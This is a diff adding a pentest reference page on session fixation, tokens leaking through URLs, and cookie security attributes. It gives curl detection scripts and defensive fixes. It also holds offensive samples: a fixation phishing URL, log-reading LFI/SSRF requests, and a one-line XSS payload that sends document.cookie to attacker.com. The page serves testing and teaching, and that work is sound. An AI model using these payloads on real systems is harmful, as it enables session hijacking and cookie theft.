@@ -1,0 +1,334 @@
+---
+title: Session fixation & token exposure
+description: Session tokens that survive login state changes, tokens leaked through URLs or Referer headers, and the insecure cookie attributes that enable theft.
+mitre: [T1539, T1550.004]
+d3fend: [D3-MENCR]
+impact: [SessionTakeover]
+owasp: [A07]
+sidebar:
+  order: 10
+  label: Session fixation
+---
+import { Aside } from '@astrojs/starlight/components';
+
+## TL;DR
+
+A session token should change at every privilege boundary (login, logout, role change). Tokens that don't, combined with applications that accept attacker-chosen tokens, create session fixation. Token-in-URL and weak cookie attributes are the related leak paths.
+
+```
+# Session fixation - application accepts attacker-supplied token
+GET /?SESSIONID=ATTACKER_CHOSEN          → app sets SESSIONID=ATTACKER_CHOSEN
+victim then logs in                       → SESSIONID unchanged (BUG)
+attacker uses SESSIONID=ATTACKER_CHOSEN  → now logged in as victim
+
+# Token in URL - leaks via Referer
+https://app.com/dashboard?token=abc123    → user clicks external link
+                                          → Referer header leaks token to external site
+
+# Insecure cookie attributes
+Set-Cookie: SESSIONID=...                 ← missing HttpOnly (XSS-stealable)
+Set-Cookie: SESSIONID=...                 ← missing Secure (HTTP-interceptable)
+Set-Cookie: SESSIONID=...                 ← missing SameSite (CSRF-vulnerable)
+```
+
+Success indicator: operator gains access to a session they shouldn't have - either by fixing it in advance and waiting for the victim to log in, or by stealing it through one of the leak paths.
+
+## Session fixation - the attack
+
+The attacker pre-sets a session token to a value they know, then waits for the victim to authenticate using that token. After authentication, the same token now represents an authenticated session - and the attacker still has the token.
+
+### Vulnerable flow
+
+```
+1. Attacker visits /login?SESSIONID=knownvalue
+   → application sets Cookie: SESSIONID=knownvalue on attacker's browser
+   
+2. Attacker phishes victim with the same URL
+   → application reuses Cookie: SESSIONID=knownvalue on victim's browser
+   
+3. Victim logs in normally
+   → application authenticates, BUT does not rotate SESSIONID
+   
+4. Attacker uses Cookie: SESSIONID=knownvalue
+   → application treats request as victim's authenticated session
+```
+
+The bug is in step 3 - the application should issue a new session ID at the moment of login. When it doesn't, the pre-shared session ID gets "upgraded" to authenticated status.
+
+### Required conditions for fixation
+
+For fixation to work, two conditions both need to hold:
+
+1. **The application accepts attacker-influenced session tokens** - usually through a URL parameter (`?SESSIONID=...`) that the application copies into a cookie
+2. **The application does not rotate the session token at login** - the token stays the same before and after authentication
+
+Modern frameworks (Spring Security, ASP.NET, Django, Rails) regenerate session IDs at login by default. The bug appears in custom session handling or older frameworks where the behavior isn't default.
+
+### Detection
+
+```bash
+# Step 1 - get an unauthenticated session token
+curl -s -c /tmp/c1.txt https://<TARGET>/ > /dev/null
+PRE=$(grep SESSIONID /tmp/c1.txt | awk '{print $7}')
+
+# Step 2 - log in using that same session token
+curl -s -b /tmp/c1.txt -c /tmp/c2.txt \
+     -X POST -d "user=yourself&pass=yourPass" \
+     https://<TARGET>/login > /dev/null
+POST=$(grep SESSIONID /tmp/c2.txt | awk '{print $7}')
+
+# Step 3 - compare
+echo "Pre-login:  $PRE"
+echo "Post-login: $POST"
+if [ "$PRE" = "$POST" ]; then
+    echo "[!] Session ID did not rotate - fixation possible"
+else
+    echo "[+] Session ID rotated - fixation not feasible at this endpoint"
+fi
+```
+
+### URL-parameter fixation
+
+The classic attack vector - application accepts session ID from URL:
+
+```
+https://target.example.com/?SESSIONID=anyrandomvalue
+```
+
+Vulnerable response:
+
+```http
+HTTP/1.1 302 Found
+Set-Cookie: SESSIONID=anyrandomvalue              ← honored the URL parameter
+Location: /login
+```
+
+The application reads `SESSIONID` from the URL, sets it as a cookie, and bounces to the login page. After the user logs in with this pre-set session ID, the attacker can use the same ID.
+
+### Exploitation
+
+The phishing payload is just a URL with the chosen session ID:
+
+```
+https://target.example.com/?SESSIONID=ATTACKER_KNOWN_VALUE
+```
+
+Send this to the victim through any channel that gets them to click. After they log in, the attacker's session - using the same `SESSIONID` - is now authenticated as the victim.
+
+### Defending against fixation
+
+Two-part fix:
+1. Don't accept session IDs from URL parameters
+2. Always rotate the session ID at login (and at any other privilege boundary)
+
+The first prevents the attacker from controlling the initial session ID. The second prevents the pre-login ID from being meaningful even if the attacker manages to set it through another means (e.g., XSS, MITM).
+
+## Token in URL
+
+Session tokens, password-reset tokens, or API tokens in URL parameters leak through several channels:
+
+```
+https://app.example.com/dashboard?session=abc123
+https://app.example.com/reset?token=xyz789
+```
+
+### Leak vector 1 - Referer header
+
+When the user clicks an external link from a page that contains the token in the URL, the browser sends the full source URL as the `Referer` header:
+
+```
+GET /external-link HTTP/1.1
+Host: external-site.com
+Referer: https://app.example.com/dashboard?session=abc123       ← leaked
+```
+
+The external site's server logs now contain the token. Defenders against this:
+
+```html
+<!-- HTML attribute that prevents Referer leak per link -->
+<a href="https://external.com" rel="noreferrer">link</a>
+
+<!-- Page-wide policy -->
+<meta name="referrer" content="strict-origin-when-cross-origin">
+```
+
+Modern browsers default to `strict-origin-when-cross-origin`, which strips the path and query from the Referer when crossing origins. The leak is reduced but not eliminated - same-origin links still pass the full URL.
+
+### Leak vector 2 - Server logs
+
+Web servers (Apache, Nginx, ALB, etc.) log the full request URL by default - including any query parameters:
+
+```
+192.168.1.1 - - [11/May/2026:20:00:00 +0000] "GET /dashboard?session=abc123 HTTP/1.1" 200 1234
+```
+
+Anyone with log access - system administrator, log-aggregation service, compromised log-shipping pipeline - has every token that's ever been in a URL.
+
+### Leak vector 3 - Browser history
+
+The full URL is stored in browser history. A shared workstation, browser-history-syncing across devices, or browser-extension access exposes the token.
+
+### Leak vector 4 - Analytics / third-party scripts
+
+JavaScript on the page sends URL information to analytics providers, error trackers, customer-support tools, etc. Every third-party script with `document.location` access receives the token.
+
+### Exploitation
+
+If the application puts tokens in URLs, the attacker's job is to *reach* one of the leak paths:
+
+```
+# Find LFI / SSRF reaching log files
+# (separate vulnerability classes - see SSRF and File Inclusion pages)
+GET /admin/logs/access.log
+GET /api/fetch?url=file:///var/log/nginx/access.log
+
+# Compromise the analytics dashboard
+# (whatever analytics provider - credentials in pastebin, leaked accounts)
+
+# Compromise a third-party script
+# (subdomain takeover, abandoned CDN, npm package supply chain)
+```
+
+For pentest scope, even just *demonstrating* that tokens are in URLs is a finding - the leak paths are then a question of "how easy is it to reach the logs" rather than "is this vulnerable."
+
+### Detection - find tokens in URLs
+
+```bash
+# Crawl the application and look for URLs with token-shaped parameters
+# (32+ char alphanumeric strings, signed strings, etc.)
+curl -s https://<TARGET>/ | grep -oE 'https?://[^"]*[?&](token|session|key)=[^&"]+'
+
+# Or check the URL bar after specific actions:
+# - After password reset: does the new-password URL contain the token?
+# - After "share link" features: do the share URLs contain authentication?
+# - After OAuth flow: does the callback URL keep the auth code?
+```
+
+OAuth callback URLs are the canonical example - they put the auth code in the URL by design, and the spec accepts this risk explicitly. Real OAuth implementations need to immediately exchange the code (short-lived) for an access token rather than letting the code persist anywhere it might leak.
+
+## Cookie security attributes
+
+Even when the session ID rotates correctly and isn't in URLs, weak cookie attributes enable theft:
+
+```
+Set-Cookie: SESSIONID=abc123; HttpOnly; Secure; SameSite=Strict
+            └─────value─────┘ │         │       └─ cross-site
+                              │         └─ HTTPS only
+                              └─ no JS access
+```
+
+### `HttpOnly`
+
+Prevents JavaScript (`document.cookie`) from reading the cookie. The defense against XSS-driven cookie theft.
+
+Missing `HttpOnly` + XSS = full session takeover via:
+
+```javascript
+new Image().src = "https://attacker.com/steal?c=" + document.cookie;
+```
+
+Even a small reflected XSS becomes a session-stealing primitive when `HttpOnly` is missing.
+
+### `Secure`
+
+Restricts the cookie to HTTPS connections. Without it, a user who briefly hits an `http://` URL (typo'd address, downgrade attack, mixed content) sends the cookie over plaintext - interceptable by anyone on the network path.
+
+Less critical now that HSTS and HTTPS-everywhere are the norm, but still worth checking. Production apps should be using `Secure` on every authentication-related cookie.
+
+### `SameSite`
+
+Controls cross-site cookie inclusion. Three values:
+
+| Value | Behavior |
+| --- | --- |
+| `Strict` | Cookie only sent on same-site requests (highest security, breaks some legitimate cross-site flows) |
+| `Lax` | Cookie sent on top-level navigations (clicking a link) but not on cross-site POSTs, iframes, etc. (browser default) |
+| `None` | Cookie sent on all cross-site requests (must be paired with `Secure`) |
+
+Missing `SameSite` (or set to `None`) enables CSRF attacks - attacker's site can cause the user's browser to send authenticated requests to the target. Modern browsers default to `Lax` if not specified, so the bug is less common than it used to be but still appears.
+
+### Detection
+
+```bash
+# Examine the Set-Cookie headers
+curl -s -I -X POST -d "user=yourself&pass=yourPass" https://<TARGET>/login | grep -i set-cookie
+```
+
+A secure cookie looks like:
+
+```
+Set-Cookie: SESSIONID=abc123; Domain=app.example.com; Path=/; HttpOnly; Secure; SameSite=Lax; Expires=...
+```
+
+Missing any of `HttpOnly`, `Secure`, `SameSite` → finding.
+
+### Path and Domain
+
+Two more attributes worth knowing:
+
+- `Domain=` - too-broad domain (`.example.com` instead of `app.example.com`) sends the cookie to sister applications that don't need it
+- `Path=` - `Path=/` sends to all paths; restricting to `/app` reduces exposure
+
+Generally minor unless the application has known-vulnerable sibling apps on related subdomains.
+
+## Concurrent sessions
+
+A separate but related concern - should a user be allowed to be logged in from two places at once?
+
+```
+User logs in from laptop      → SESSIONID=A issued
+User logs in from phone       → SESSIONID=B issued
+Both sessions remain valid
+```
+
+Allowing concurrent sessions is the default for almost every web app and isn't usually a finding. But for high-security applications (banking, admin panels), the more secure behavior is to invalidate the previous session when a new one is created - protecting against stolen-credential scenarios.
+
+When testing, document the behavior:
+
+```bash
+# Log in from "browser 1"
+curl -c /tmp/b1.txt -X POST -d "user=x&pass=y" https://<TARGET>/login
+
+# Log in from "browser 2"
+curl -c /tmp/b2.txt -X POST -d "user=x&pass=y" https://<TARGET>/login
+
+# Test whether browser 1's session is still valid
+curl -b /tmp/b1.txt https://<TARGET>/dashboard
+# - Dashboard loads → concurrent sessions allowed
+# - Redirect to login → only one session at a time (more secure)
+```
+
+## Lifetime and timeout
+
+Session tokens should expire:
+- After a period of **inactivity** (sliding window) - common: 15 minutes to 1 hour
+- After a **total** time regardless of activity (absolute) - common: 8 hours to 24 hours
+
+Never-expiring sessions are bad - they outlive job changes, device theft, compromised credentials. Detection:
+
+```bash
+# Log in, capture cookie, wait a long time, retry
+# If the session still works after 24+ hours of inactivity → no inactivity expiry
+```
+
+Absolute expiry is harder to test in an engagement (you'd need to wait a day). The application's documentation, or the cookie's `Expires` / `Max-Age` attribute, usually states the intent.
+
+## JWT specific issues
+
+JWT tokens have their own characteristic issues that share some surface with the cookie-attribute discussion above. See [JWT](/codex/web/auth/jwt/) for the dedicated treatment.
+
+## Notes
+
+- **Session fixation is mostly a legacy bug.** Frameworks have defaulted to "rotate session ID on login" for over a decade. The bug appears in custom session handling, very old apps, or apps that disabled the default for performance reasons. Always check anyway - it's a single test.
+- **Token in URL is more common than fixation.** Reset links, magic links, share links, OAuth callbacks all use URLs deliberately. The job is to identify which of those are *session-relevant* (versus genuinely one-shot) and check the leak paths.
+- **The HTTP request shape often tells the whole story.** A single Burp capture of "login submitted → session cookie set" usually answers: was the pre-login session retained? Is the cookie marked HttpOnly/Secure/SameSite? Does the URL contain the token? Five seconds of reading vs. running a dozen tools.
+- **For HSTS testing, look at "first visit" not the steady state.** Modern browsers cache HSTS, so subsequent visits are HTTPS-only regardless of cookie attributes. The exposure window is the very first visit to the domain - exactly when `Secure` matters most.
+
+<Aside type="tip">
+The fastest single test for this whole page: log in, capture the request and response, then audit:
+(1) Did the SESSIONID change at login?
+(2) Is the SESSIONID in any URL anywhere?
+(3) Do the Set-Cookie headers include HttpOnly, Secure, and SameSite?
+
+Three "no" answers = three findings, all from one Burp capture.
+</Aside>
